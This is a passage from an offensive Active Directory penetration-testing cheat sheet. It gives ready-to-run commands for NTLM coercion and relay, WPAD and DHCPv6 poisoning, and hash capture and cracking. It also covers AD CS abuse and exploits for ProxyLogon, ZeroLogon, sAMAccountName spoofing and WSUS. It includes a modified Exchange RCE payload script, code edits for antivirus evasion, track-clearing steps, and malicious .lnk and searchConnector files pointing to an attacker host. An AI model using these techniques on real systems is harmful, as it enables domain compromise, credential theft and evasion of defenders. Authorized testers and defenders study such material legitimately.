- ShadowCoerce \(MS\-FSRVP\): the coerced authentications are made over SMB\ and it is required that the "File Server VSS Agent Service" is enabled on the target server:
    - SMB relay: \(execute at least 2x\) \([ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)\): `python3 shadowcoerce.py -d "<domain>" -u "<user>" -p "<password>" <own ip> <target ip>`
- DFSCoerce (MS-DFSNM): the coerce technique only works on domain controllers:
	- SMB relay \([DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)\): `python3 dfscoerce.py -u <username> -d <FQDN> <own IP> <target DC IP>`

##### _Coerce NTLM connection via Windows shortcut:_
To coerce a request, create a Windows shortcut \(\.lnk\) with the icon set to a UNC path of the attacker host, place it in a network share and wait for a user to browse that share to trigger the SMB request\. Use Responder or NLTMrelayx to capture the request\. 
- 1\. Start any capture or relay technique with Responder and/or ntlmrelayx\. 
- 2\. Search for network shares that are accessible for most authenticated users 
- 3\. Create a shortcut with an icon set to an UNC path that is pointing to the relay server:
	- 1: `$wsh = new-object -ComObject wscript.shell`
	- 2\. Change location to locally save the lnk file: `$shortcut = $wsh.CreateShortcut("C:\Payloads\test.lnk")`
	- 3\. Change the IP so it points to your relay server/pivot host: `$shortcut.IconLocation = "\\10.10.17.231\test.ico"`
	- 4: `$shortcut.Save()`
- 4\. Upload and place the \.lnk file in an open network share that is frequently used\.

##### _Capture authentication and keep session alive:_
This technique intercepts and keeps valid authenticated sessions alive\. The sessions can either be intercepted by Responder or manually coerced via techniques like PetitPotam\. This makes it possible to proxy attacks that require credentials through the client session and make it authenticated\. Multiple protocols are supported \(e\.g\. smb, ldap, mssql\). 
- 1\. Start ntlmrelayx and specify the system to which the session will be forwarded to \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 ntlmrelayx.py -smb2support -t <IP target host> -smb2support -socks`
- 2\. Use any technique to intercept \(e\.g\. Responder\) or coerce \(e\.g\. PetitPotam\) an authenticated request\.
- 3\. Ones a session is captured by ntlmrelayx:
	- 1\. In the ntlmrelayx tool cli:
		- 1\. Check what type of session is captured: `socks`
		- 2\. Stop all running services but keep the proxied connection alive: `stopservers`
	- 2\. Modify '/etc/proxychains4\.conf' and set proxy settings to ‘socks4 127\.0\.0\.1 1080’\.
- 4\. use any authenticated tool \(e\.g\. smbclient\) or privilege escalation technique \(e.g. RBCD \+ weblclient\) in combination with proxychains to conduct an authenticated attack \(specify as 'domain/username' the 'domain/username' of the captured session and if possible use an option like '\-no\-pass' or use a blank password\)\. As an example, PetitPotam is used leveraging the captured session privileges: `proxychains4 python3 Petitpotam.py -d <domain> -u <relayed computer name (e.g. DC01)>\$ <Responder Machine Name>@80/test <FQDN target system>`

##### _Remote workstation takeover via WebClient and relay attack:_
- 1\. Enumerate for computers with the WebClient service running:
	- \([webclientscanner](https://github.com/Hackndo/WebclientServiceScanner)\): `(proxychains4) webclientservicescanner <FQDN>/<username>@<network ip>/24 -dc-ip <IP DC>`
	- \([GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus)\): `GetWebDAVStatus.exe <servername, servername>`
- 2\. \(optional\) it is possible to trick a system in enabling its WebClient service, by uploading the following script in a widely accessible directory and give it the name “Documents\.searchConnector\-ms”\. Every time a user visits that directory the WebClient service of that user’s machine will start automatically:
    ```XML
    <?xml version="1.0" encoding="UTF-8"?> <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector"> <iconReference>imageres.dll,-1002</iconReference> <description>Microsoft Outlook</description><isSearchOnlyItem>false</isSearchOnlyItem> <includeInStartMenuScope>true</includeInStartMenuScope> <iconReference>https://192.168.10.10/0001.ico</iconReference> <templateInfo> <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType> </templateInfo> <simpleLocation> <url>https://www.intranet.net/</url></simpleLocation> </searchConnectorDescription>
    ```
- 3\. Start relay server that will convert http traffic to ldaps, create a new computer account on behalf of the target system and set RBCD \([impacket](https://github.com/SecureAuthCorp/impacket/)\): `python3 ntlmrelayx.py -smb2support -t ldaps://<FQDN DC> --delegate-access`
- 4\. Start Responder to establish host name resolution to your own attacker system \(turn smb and http off in Responder\.conf\) \([Responder](https://github.com/lgandx/Responder)\): `python Responder.py -I <interface> -v`
- 5\. Coerce a target system with the WebClient running to make a webdav \(http\) based authentication request to your relay server\. Use any of the HTTP based relay methods discribed in the “Remotely coerce target computer to authenticate to an arbitrary system” section\. 
- 6\. Use the created computer account to impersonate any user on the target system via S4U2Proxy \(impacket\): `python3 getST.py \-spn host/<FQDN target system> -dc-ip <IP DC> -impersonate Administrator <FQDN>/<name new computer account>\$`
- 7\. Export the ticket into your environment and use any impacket tool \(e\.g\. secretsdump\) in combination with the '\-k' option\.

##### _Exchange HTTP coerce feature combined with NTLM\-relay attack:_
This technique leverages the ability to coerce an Exchange server based on the Exchange "PushSubscription" feature to authenticate to an arbitrary URL over HTTP\. This makes it possible to coerce the Exchange server to authenticate to a NTLM\-relay server and \(mis\)use the default high privileges of the Exchange server to set the "replicate" privileges to an arbitrary AD account\. With the DCSync privileges set, it is possible to dump all the hashes from the domain\.
>For this attack to work, you need control over an AD user that has a mailbox on the target Exchange server\.
- 1\. Start NTLM\-relayx server and specify the user that gets the DCSync privileges \(instead of escalating an user it is also possible to use the "delegate\-access" option with LDAPS and this will make both a new user account \(with DCSync\) and a computer account \(with RBCD for the Exchange server\)\) \([impacket](https://github.com/SecureAuthCorp/impacket/)\): `python3 ntlmrelayx.py -smb2support -t ldap://<FQDN DC> --escalate\-user <username to set DCSync to>`
- 2\. Coerce the Exchange server to make an authenticated request to the relay server \(the account must have a mailbox\) \([PrivExchange](https://github.com/dirkjanm/privexchange/)\): `python3 privexchange.py -ah <own ip> <FQDN Exchange server> -u <username> -d <FQDN> (--hashes :<NTLM>)`
- 3\. Use the obtained DCsync privilege to dump domain hashes\. 

##### _Get initial system level access via SMB relay attack:_
This technique allows for remote code exection with AV evasion to establish a beacon with SYSTEM privilleges on the target system\. 
>This technique requires that SMB singing is disabled on the target system \(not necessarily on the system the related connection is coming from\)\. Furthermore, the relayed authentication can’t be used for the same target system as it originates from, and only relayed users with admin privileges are useful for this purpose\. 
- 1\. Check which systems have SMB signing disabled and create list \([CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)\): `crackmapexec smb <target ip range> --gen-relay-list targets.txt`
- 2\. Modify the Responder\.conf configuration file and disable “SMB” and “HTTP” before starting the tool \([Responder](https://github.com/lgandx/Responder)\): `python Responder.py -I <interface>`
- 3\. For OS command execution some basic AV detection evasion is necessary\. Therefore, modify the code on lines 379\-381 in ALL the impacket python3 secretsdump\.py scripts that hold the following code block \(can’t tell which one is used\) \(e\.g\. “/usr/local/lib/python3\.9/dist\-packages/impacket/examples/secretsdump\.py”\):
    ```
    self.__batchFile = 'C:\\Users\\Public\\Documents\\update.bat
    self.__shell = '%COMSPEC% /Q /c '
    self.__output = 'C:\\Users\\Public\\Documents\\update__output'
    self.__answerTMP = b''
    ```
- 4\. Start the attack and hope for an opportunity to relay a high privileged account \([impacket](https://github.com/SecureAuthCorp/impacket/)\): `python3 ntlmrelayx.py -smb2support -tf targets.txt -c "powershell.exe <command>"`

##### _Dump hashes via SMB relay attack:_
This technique can dump the local system hashes if a high integrity session is relayed\.  
- 1\. Start the relay server: `python3 ntlmrelayx.py -t smb://<target IP with SMB singing off> -smb2support`
- 2\. Use any available method \(\.lnk files, wpad spoofing, etc\.\) to capture an authentication request and hope its from a user with high privileges on the target system\. 

##### _Initial foothold via Cisco phone relay attack:_
Search for SSH keys in Cisco phone configuration files, gain access to the Cisco Unified Communications Manager \(CUCM\) web interface, and capture the LDAP domain credentials of the configured service account\. 
- 1\. Automatically download and parse configuration files from Cisco phone systems searching for SSH credentials\. Try all the following scan options \([SeeYouCM\-Thief](https://github.com/trustedsec/SeeYouCM-Thief)\):
	- Attempt to download every config in the listing: `./thief.py -H <Cisco CUCM Server IP> (--verbose)`
	- Parse the web interface for the CUCM address and do a reverse lookup for other phones in the same subnet: `./thief.py --phone <Cisco IP Phoner> (--verbose)`
	- Specify a subnet to scan with reverse lookups: `./thief.py --subnet <subnet to scan>`
- 2\. If you found SSH credentials, use the creds to login to the CUCM web interface 
- 3\. Start Responder to capture the plaintext creds of the service account \([Responder](https://github.com/lgandx/Responder)\): `python Responder.py -I <interface> -v`
- 4\. In the CUCM web interface, go to the LDAP Authentication settings and update one of the servers to be the IP address of Responder and click save\.
- 5\. If successful, check if the credentials are valid domain creds\.

##### _Initial local admin access via DHCPv6 spoofing and DNS poisoning:_
This attack leverages DHCPv6 spoofing to provide a booting or newly plugged in computer on the network a fake IP config that points to the attacker system\. Furthermore, DNS poisosing is used to trick the client in requesting every domain name resolution in which the attacker server jumps in and uses that request in a relay attack\.   
>IPv6 must be enabled and not used within the local network, for RBCD the CA Role must be installed on the target DC, the MachineAccountQuota must not be 0, and smb signing must be disabled on the target computer\. It is recommended to run this attack during a period of the day \(e\.g\. morning\) where the target system\(s\) most likely start\-up and thereby request for a DHCPv6 address\. However, keep it short \(max\. 5 min\) this tool can DoS the network\. 
- 1\. Check which systems have SMB signing disabled and create a list \([CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)\): `crackmapexec smb <target ip range> --gen-relay-list targets.txt`
- 2\. Start the relay server:
	- LDAPS + RBCD: no creds required, new computer account is automatically created \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 ntlmrelayx.py -6 -wh <not existing host (e.g. notexist)> -smb2support -tf targets.txt -t ldaps://<FQDN DC> --delegate-access (--no-da) (--no-acl) (--no-validate-privs)`
	- LDAP + RBCD: credentials required, new computer account must be created manually:
		- 1\. Create new machine account based on the already owned domain user/computer account \(impacket\): `python3 addcomputer.py -dc-ip <DC IP> -method SAMR -computer-pass <new password> -computer-name <new computer account name> <FQDN>/<owned account name> (-hashes <NTLM hash>)`
		- 2\. Run ntlmrelayx \(impacket\): `python ntlmrelayx.py python3 ntlmrelayx.py -6 -wh <not existing host (e.g. notexist)> -smb2support -tf targets.txt -t ldap://<FQDN DC> --escalate-user <name of created computer account>\$ --delegate-access \(--no-da) (--no-acl) (--no-validate-privs)`
	- Dump local SAM via admin account relay \(impacket\): `python3 ntlmrelayx.py -6 -wh <not existing host (e.g. testhost)> -smb2support -tf targets.txt` 
- 3\. Start DHCPv6 spoofer \(use "\-hw" parameter to whitelist target computers\) \([mitm6](https://github.com/fox-it/mitm6/)\): `mitm6 -i <interface to listen on> -d <domain> (-hw <FQDN of target computer account>) --ignore-nofqdn`
- 4\. Use the created or elevated computer account to impersonate any user on the target system via S4U2Proxy or leverage the dumped hashes 

##### _WPAD/Proxy Poisoning:_
Browsers may have the system configuration enabled that allows for "automatic proxy detection"\. This forces the system to request a WPAD\.dat file that contains the proxy settings\. If no WPAD\.dat file is served within the network, this can be exploited by a MitM attack\. 
>the Chrome browser has/had this feature enabled by default\. 
- Capture NetNTLM hashes: start Responder and as soon a victim opens the browser, the hash will be captured \([Responder](https://github.com/lgandx/Responder)\): `python Responder.py -I <interface> -w -F`
- Prompt for login creds: Start Responder and as soon the victim actively uses the search bar in the browser, the user will be prompt for its credentials \(Responder\): `python Responder.py -I <interface> -P -b`
- Dump domain information \(users, groups, etc\.\): Run ntlmrelayx and then start Responder \(same as "Capture NetNTLM hashes"\)\. As soon a victim opens the browser, the authentication will be relayed to LDAP and queries the DC \(this included email addresses\) \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 ntlmrelayx.py -t ldaps://<FQDN DC> -smb2support`
- Start remote SYSTEM level beacon: check the ‘Get remote system level access via SMB relay attack’ method below and use the WPAD spoofig option for Responder\. This will start a SYSTEM level beacon when a user with \-admin level privs\- is using Chrome for example\. 

##### _NETNTLMv1/2 hash capture:_
- NetNTLMv2:
    - 1\. Check if in the Responder\.conf configuration file all options are set to “On”\.
    - 2\. Run responder \(use "\-f" for fingerprint and "\-v" for not skipping previously captured hash\) \([Responder](https://github.com/lgandx/Responder)\): `python Responder.py -I <interface> (-v) (-f)`
    - 3\. Course the target system remotely or via Capture hashes \(all hashes are stored here "/usr/share/responder/logs/"\):
    - 4\. Recover password from NetNTLMv2 hash: `hashcat -m 5600 <hash.txt> <wordlist.txt>`
- NetNTLMv1:
    - 1\. For Responder, change in the configuration file variable "Challange = Random" to "Challange = 1122334455667788"
    - 2\. Start responder \([Responder](https://github.com/lgandx/Responder)\): `python Responder.py -I <interface> --lm`
    - 3\. Coerce the target system to authenticate.
    - 4\. Use crack\.sh to convert NetNTLMv1 to a NTLM hash:
    	- 1\. Copy the first "response" part of the captured hash \(which uses the format "username::hostname:response:response:challenge"\) and paste it after the word “NTHASH: NTHASH:<response string>”
    	- 2\. Submit the "NTHASH:response" string as a token to [crack\.sh](https://crack.sh/get-cracking/)
    	- 3\. Enter email address on which you want to receive the extracted NTLM hash on
    	- 4\. Use the NTLM hash to login,dump hashes, etc\.

##### _Drop\-the\-MIC \(CVE-2019\-1040\) DC to DC:_
*MIC \(Message Integrity Code\) is a NTLM authentication security control that prevents modification of the included 3 NTLM messages based on a signature\. This must prevent relaying SMB authenticaton traffic to LDAP\. However, it is possible to modify the NTLM authentication packets and bypassing MIC without invalidating the authentication\. This makes it possible to relay SMB authentication to LDAP\. 
- 1\. Start ntlmrelayx to relay the SMB connection from the second DC to LDAP \(bypass MIC\): 
	- Create new computer account \(requires LDAPS\) \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 ntlmrelayx.py -t ldaps://<FQDN DC01> --remove-mic --delegate-access -smb2support (--no-da) (--no-acl) (--no-validate-privs)`
	- Elevate user account \(doesn't require LDAPS\): `python3 ntlmrelayx.py -t ldap://<FQDN DC01> --remove-mic --escalate-user <username> -smb2support`
- 2\. Coerce the vulnerable DC (second DC) to authenticate. 
- 3\. If a new computer account with RBCD rights was created, generate a TGT and impersonate any high priv users agianst DC02 \(impacket\): `getST.py -spn host<FQDN DC02> -dc-ip <IP DC02> -impersonate Administrator <FQDN>/<created computer account with constrained delegation permissions>\$`
- 4\. Export the ticket into your environment and use any impacket tool \(e\.g\. secretsdump\) in combination with the '\-k' option\.

##### _Drop\-the\-MIC \(CVE-2019\-1040\) Exchange to DC:_
- 1\. Start ntlmrelayx to relay the SMB connection to LDAP \([impacket](https://github.com/SecureAuthCorp/impacket)\): `sudo ntlmrelayx.py --remove-mic --escalate-user <username to add DCSync> -t ldap://<FQDN or IP target DC> -smb2support`
- 2\. Coerce the Exchange server to authenticate. 
- 3\. Abuse the created computer account to dump hashes on the target DC\. 


---
### __Specific AD server vulnerability exploitation:__
##### _Certifried: AD CS Domain privilege escalation (CVE-2022-26923):_
In essence, this vulnerability allows a low-privileged user to escalate privileges to domain administrator in a default Active Directory environment with the AD CS server role installed. More info about the privesc method can be found  [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4).
- 1\. Obtain the CA Name: 
	- \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)\): `adcs_enum_com2`
	- \([Certipy](https://github.com/ly4k/Certipy)\): `certipy find '<FQDN>'/'<username>':'<password>'@'<IP or FQDN of CA server>'`
- 2\. Create a new computer account with the dNSHostName attribute set to the domain controller's FQDN.
	- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\): `CVE-2022-26923 <new name computer account>`
	- \([bloodyAD](https://github.com/CravateRouge/bloodyAD)]\):
		- 1. Create new machine account (bloodyAD): `python3 bloodyAD.py -d <FQDN> -u <username> -p '<password>' --host <IP DC> addComputer <new computer name> '<new password>'`
		- 2. Set the dNSHostName attribute of the new machine account to the domain controller's FQDN (bloodyAD): `python3 bloodyAD.py -d <FQDN> -u <username> -p '<password>' --host <IP DC> setAttribute 'CN=<computer name>,CN=Computers,DC=<domain>,DC=<com>' dNSHostName '["<FQDN DC>"]'`
		- 3. Verify if successful (bloodyAD): `python3 bloodyAD.py -d <FQDN> -u <username> -p '<password>' --host <IP DC> getObjectAttributes 'CN=<computer name>,CN=Computers,DC=<domain>,DC=<com>' dNSHostName`
- 3\. (optional) start socks proxy if the DC01/ADCS servers can't be reached directly from the attacker system
- 4\. Request a machine certificate (Certipy): `(proxychains4) certipy req 'example.local/<new machine account>$:<Password>@<CA server IP>' -ca <CA-NAME> -template Machine`
- 5\. Authenticate to the domain using the requested certificate and obtain the DC machine account NTLM hash (Certipy): `(proxychains4) certipy auth -pfx <dc01>.pfx -dc-ip <DC IP>`
- 6\. Use the obtained NT hash to, for example, dump hashes (impacket): `(proxychains4) secretsdump.py '<FQDN>/<DC>$@<DC IP>' -hashes :<DC NT Hash> -just-dc-user <domain>/krbtgt`

##### _AD CS vulnerable template privilege escalation \(ESC1\):_
This technique exploits vulnerable ADCS templates which leads to the compromise of any domain account\. To mark a template as vulnerable, the following things should apply: \[1\] the 'pKIExtendedKeyUsage' options must allow for 'Smart Card Logon' and/or 'Client Authentication'; \[2\] not privileged groups \(e\.g\. Domain Users\) have the 'Enrollment Permissions' set; and \[3\] the 'msPKI\-Certificate\-Name\-Flag' is set with the option 'ENROLLEE\_SUPPLIES\_SUBJECT' which allows for changing the ticket to any user/computer account in the domain\.
>As an alterative approach, don't impersonate a DA account but instead impersonate a DC computer account\. After obtaining the NTLM hash of the DC, perform DCSync to another DC for better opsec.
- 1\. Check if ADCS is installed and identify vulnerable/abusable certificate templates using default low\-privileged groups or from the current user's context \([Certify](https://github.com/GhostPack/Certify)\): `Certify.exe find /vulnerable (/currentuser)`
- 2\. Request certificate for the vulnerable template and specify a DA as the alternate principle \(Certify\): `Certify.exe request /ca:<CA Name> /template:<vuln template name> /altname:<DA username>`
- 3\. Copy the returned certificate \(\-\-\-\-\-BEGIN RSA PRIVATE KEY\-\-\-\-\- \.\.\. \-\-\-\-\-END CERTIFICATE\-\-\-\-\-\), save it in a file called 'cert\.pem' and convert it to a \.pfx file \(don't enter a password\): `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
- 4\. Upload the cert\.pfx file to the current compromised system
- 5\. Request a TGT for the 'altname' user \([Rubeus](https://github.com/GhostPack/Rubeus)\): `Rubeus.exe asktgt /user:<altname> /certificate:C:\users\public\documents\cert.pfx (/nowrap | /ptt)`

##### _AD CS HTTP end\-point privilege escalation \(ESC8\):_
This NTLM\-relay attack uses the ADCS HTTP enrollment interface to request a client authentication certificate based on the 'User' or 'Machine' certificate templates \(these templates are enrolled by default, support 'Client Authentication' and can be enrolled by low\-priv users and computer accounts\)\. 
- 1\. List and verify if a vulnerable template is enrolled \([Certipy](https://github.com/ly4k/Certipy)\): `certipy find '<FQDN>'/'<username>':'<password>'@'<IP or FQDN of CA server>'`
- 2\. Start the relay server that points to the CA server \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 ntlmrelayx\.py -t "http://<FQDN CA server>/certsrv/certfnsh.asp" --adcs --template "<vulnerable template name (e.g. User)>"`
- 3\. Coerce authentication from another high priveged server that is not the CA server \(e\.g\. via PetitPotam, SpoolSample or PushSubscription\)\.
- 4\. If successful, copy the returned base64 encoded certicate string and paste it in a file called 'cert\.pem'
- 5\. Use the obtained certificate to request a TGT for the relayed computer account \([PKINITtools](https://github.com/dirkjanm/PKINITtools)\): `(proxychains4) python3 gettgtpkinit.py <FQDN>/<relayed computer name>\$ -pfx-base64 $(cat cert.pem) -dc-ip <DC IP> out_tgt.ccache`
- 6\. Import TGT in your current environment: `export KRB5CCNAME=out_tgt.ccache`
- 7\. Request a TGS for a user that is an administrator \(e\.g\. DA\) on the relayed computer \(PKINITtools\): `(proxychains4) python3 gets4uticket.py kerberos+ccache://<FQDN>\\<relayed computer name>\$:out_tgt.ccache@<IP DC> host/<FQDN relayed computer>@<FQDN> Administrator@<FQDN> out_host.ccache -v`
- 8\. Import the new ticket in your current environment: `export KRB5CCNAME=out_host.ccache`
- 9\. Run any tool that supports kerberos authentication against the relayed computer \(e\.g\. impacket's WMIexec\): `impacket-wmiexec -nooutput -k -no-pass -dc-ip <DC IP> <FQDN>/Administrator@<FQDN relay server> "powershell.exe <command to run>"`

##### _DC sAMAccountName spoofing \+ PAC Abuse \(CVE\-2021\-42287/CVE\-2021\-42278\):_
The frist vulnerability allows an attacker to impersonate a domain controller using computer account sAMAccountName spoofing\. The second vulnerability affects the Kerberos Privilege Attribute Certificate \(PAC\) and allows an attacker to impersonate domain controllers\. This makes it possible to impersonate any user on any service on any system in the domain\.
- 1\. Create machine account \([Powermad\.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)\): `$pass = ConvertTo-SecureString 'Password123' -AsPlainText -Force; New-MachineAccount -MachineAccount TestSPN -Password $pass -Domain <domain> -DomainController <FQDN DC> -Verbose`
- 2\. Clear any SPN's on the machine account \(PowerView\): `Set-DomainObject "CN=TestSPN,CN=Computers,DC=hidro,DC=local" -Clear 'serviceprincipalname' -Verbose`
- 3\. Change machine account samaccountname \(Powermad\): `Set-MachineAccountAttribute -MachineAccount TestSPN -Value "<name DC>" -Attribute samaccountname -Verbose`
- 4\. Request a TGT for that newly created machine account \([Rubeus](https://github.com/GhostPack/Rubeus)\): `rubeus.exe asktgt /user:<name DC> /password:Password123 /domain:<domain> /dc:<FQDN DC> /nowrap`
- 5\. Change the machine accounts samaccountname back \(Powermad\): `Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname -Verbose`
- 6\. Request an S4U2self ticket using the retrieved TGT and get an ST encrypted with the DC's key \(for cobalt strike use the 'make\_token' \+ 'kerberos\_ticket\_use' method\) \(Rubeus\): `Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:<FQDN DC> /self /altservice:LDAP/<FQDN DC> /ticket:<ticking string> (/ptt) (/nowrap)`
- 7\. It is now possible to perform action under the context of the impersonated account \(e\.g\. DCSync\)
- 8\. \(optional\) delete the created computer account with any obtained elevated privileges\.

##### _ProxyLogon Exchange exploit:_
ProxyLogon \(CVE\-2021\-26855\) is a vulnerability in the Microsoft Exchange Server that allow an attacker to  bypass authentication and impersonating the local administrator\. This exploit is combined with a second vulnerability \(CVE\-2021\-27065\) to get RCE and a third vulnerability \(WriteDACL\) to privesc to DA\. The privilege escalation to DA is possible because of the default high privileged groups \(e\.g\. Exchange Windows Permissions\) that the Exchange computer account is a member of\. These groups have WriteDACL access on the Domain object in Active Directory and therefore allow granting DCSync rights to any account\. 
>This technique requires a valid email address that is known to the target Exchange server\. 
- 1\. Obtain a valid \(domain user\) email address and the FQDN or IP address of the target Exchange server
- 2\. Download and modify the [ExchangeSheller](https://github.com/ZephrFish/Exch-CVE-2021-26855) tool and replace all the code from line 196 to 215 with:
    ```
    payload = "<COMMAND PLACEHOLDER>"
    print("[*] Looks good, executing payload..")
    data=requests.post(shell_url,data={"code":"Response.Write(new
    ActiveXObject(\"WScript.Shell\").exec(\"%s\").StdOut.ReadAll());"%(payload)},verify=False)
    time.sleep(5)
    if "OAB (Default Web Site)" not in data.text:
        print("[-] Failed RCE, either the server is not vulnerable or something is wrong with the payload.")
    else:
        print("[+] Payload executed!")
        print("[+] Output from executed command in CMD: " + data.text.split('Name')[0])
    ```
- 3\. Run the script \(this will place a shell script named "exchmshell\.aspx" in the following folder "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\"\) \(ExhangeSheller\): `sudo python3 ExchangeSheller.py <FQDN/IP exchange server (e.g. exchange.example.com)> <valid email (e.g. user@example.com)>` 
- 4\. If successful, it is now possible to escalate to DA and leverage the default WriteDACL privileges of the Exchange server:
	- 1\. Add DCSync to the Exchange server computer account or any other user/computer account you control \(if you get an "Access is denied" message most likely the modification was still successful\) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Add-DomainObjectAcl -PrincipalIdentity <name exchange server (e.g. EXCHANGE01)> -Rights DCSync`
	- 2\. Perfom a DCSync attack.
- 5\. Clear tracks:
	- 1\. Delete added DCSync privileges \(if you get an "Access is denied" message most likely the modification was still successful\) \(PowerView\): `Remove-DomainObjectAcl -PrincipalIdentity <name exchange server> -Rights DCSync`
	- 2\. Delete the Exchange exploit shell: `del C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\exchmshell.aspx`

##### _ZeroLogon DC exploit:_
This vulnerability allows an unauthenticated attacker with network access to a domain controller, to establish a vulnerable Netlogon session and eventually gain domain administrator privileges\. 
- 1\. Verify if target is vulnerable: 
    - \([SharpKatz](https://github.com/b4rtik/SharpKatz)): `SharpKatz --Command zerologon --Mode check --Target <FQDN target DC> --MachineAccount <DC name>$`
    - \([zerologon_tester.py](https://github.com/SecuraBV/CVE-2020-1472)\) `python3 zerologon_tester.py <DC name> <DC IP>`
- 2\. Set the DC machine account password to zero and dump hashes:
    - \([SharpKatz](https://github.com/b4rtik/SharpKatz)\): `SharpKatz --Command zerologon --Mode exploit --Target <FQDN target DC> --MachineAccount <DC name>$ --Domain <FQDN> --User <username to dump hash> --DomainController <FQDN target DC>`
    - Python method:
        - 1\. \([zerologon](https://github.com/risksense/zerologon)\): `python3 set_empty_pw.py <DC NETBIOS name (e.g. DC01)> <target DC ip>`
	    - 2\. If successful, dump all hashes with the zerod DC machine account \([impacket](https://github.com/SecureAuthCorp/impacket)\): `secretsdump.py -just-dc <domain>/<DC NETBIOS name>\$@<target DC ip>`
	    - 3\. Copy the dumped DA hash and again dump all hashes in the context of the DA to obtain the DC machine hex password to fix the DC \(impacket\): `secretsdump.py <DOMAIN>/Administrator@<DC IP> -hashes <NTLM>`
        - 4\. From the latest secretsdump output, copy the "plain\_password\_hex" string of the DC machine account and restore it \([zerologon](https://github.com/risksense/zerologon)\): `python3 reinstall_original_pw.py <DC name> <target DC ip> <hex password>`

##### _Windows Software Update Service \(WSUS\) exploitation:_
This technique targets a WSUS deployment that doesn't use SSL encryption to inject a malicious update via a MITM attack\. As soon a system checks for available updates, a malicious update is served and executed\. This can result in RCE\. 
- 1\. Request the WSUS HTTP URL and verify if the updates are pushed without SSL \(if nothing is returned, WSUS is not used for updates\): `reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer`
- 2\. Create file with instructions for bettercap and name it WSUS\.cap: 
    ```
    set arp.spoof.targets <target ip or range of system to serve malicious update to>
    arp.spoof on
    set any.proxy.src_port <WSUS port (e.g. 8530)>
    set any.proxy.dst_port 8530
    set any.proxy.dst_address <own ip>
    any.proxy on
    ```
- 3\. Serve a malicious update and execute a custom command \(the binary that is served can be any binary as long its signed by MS like PsExec\) \([pywsus](https://github.com/GoSecure/pywsus)\): `python3 pywsus.py -H <own ip> -p 8530 -e PsExec64.exe -c '/acceptuela /s cmd.exe /c "<command>"'`
- 4\. Start the MITM attack \([bettercap](https://github.com/bettercap/bettercap/releases/download/v2.31.1/bettercap_linux_amd64_v2.31.1.zip)\): ./bettercap --iface <interface> --caplet WSUS.cap`
- 5\. Keep this running and as soon a system checks for new updates, the malicious update is served and the command is executed\.


---
### __Search and exfil/dump secrets stored in the domain:__
##### _Search for secrets in file shares/servers:_
- Enumerate SMB shares:
    - List all shares in the domain and check if you can access them \([SharpShares](https://github.com/djhohnstein/SharpShares)\): `SharpShares shares`
	- Crawl every share on every target system \(if provided creds don't work, it will fall back to "guest", then to a null session\): 
		- Search filenames that may contain creds \([ManSpider](https://github.com/blacklanternsecurity/MANSPIDER)\): `manspider <target ip range> -f <key word filename (e.g. cred, login) -d <domain> -u <username> -p <password>` 
		- Search for specific file type containing a keyword \([ManSpider](https://github.com/blacklanternsecurity/MANSPIDER)\): `manspider <single target ip or range> -c <keyword> -e <extension (e.g. xlsx)> -d <domain> -u <username> -p <password>`
	- Recursive list accessible shares and content \([Smbmap](https://github.com/ShawnDEvans/smbmap)\): `smbmap.py -H <target ip> -u "" -p "" (-d <domain>) -R (<share name>) (--depth 5) -A '<pattern>'`
	- Find specific files within shares \([Smbmap](https://github.com/ShawnDEvans/smbmap)\): `smbmap.py -H <target ip> -u "" -p "" (-d <domain>) -q -R (--depth 5) (--exclude <share name to exclude from recursive search>) -A '(xml|config|conf|asax|aspx|php|asp|jsp|html)'`
- Mount to SMB share:
    - 1\. Mount to target share \(use anonymous, randon username or password/hash\) \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 smbclient.py (<domain>/)<username>@<target ip> (-hashes :<NTLM>)`
    - 2\. Command options:
    	- List available shares: `shares`
    	- Mount share: `use <share name>`
    	- Move through directories and list, create and delete files/directories with normal unix commands
    	- Download file: `get <filename>`
    	- Upload file: `put <filename>`
- Connect to FTP server: `proxychains4 ftp -p <target ip>`
- Connect to TFTP server: `tftp <target ip>`
- Connect to Network File System \(NFS\) (port 2049):
    - 1\. Before mounting, first create a temporary directory as your mount point: mkdir \-p /mnt/<create directory>
    - 2\. Mount to folder:
    	- 1\. List available folders for mounting: `showmount -e <target ip>`
    	- 2\. Mount to folder: `mount -t nfs <target ip>:/<name available folder> /mnt/<created directory> -o nolock`
    - 3\. The  content of the misconfigured directory is available at: `cd /mnt/<created directory>`
    - 4\. \(optional\) if you get permission denied while trying to read a file or accessing a folder, it is possible to create a new user on your own local system and modify that users UUID so it matches the user account who owns the file/folder:
    	- 1\. Check which name and UUID owns the file/folder you dont have persmissions for \(run in the mounted folder\): `ls -la`
    	- 2\. Create a new local user with the same name as the file/folder owner: `adduser <username>`
    	- 3\. Modify the new users UUID so it matches the UUID of the file/folder owner in /etc/passwd
    	- 4\. su to the new user and gain access to the folder or read the file: `su <username>`

##### _Scan SysVol share for interesting files:_
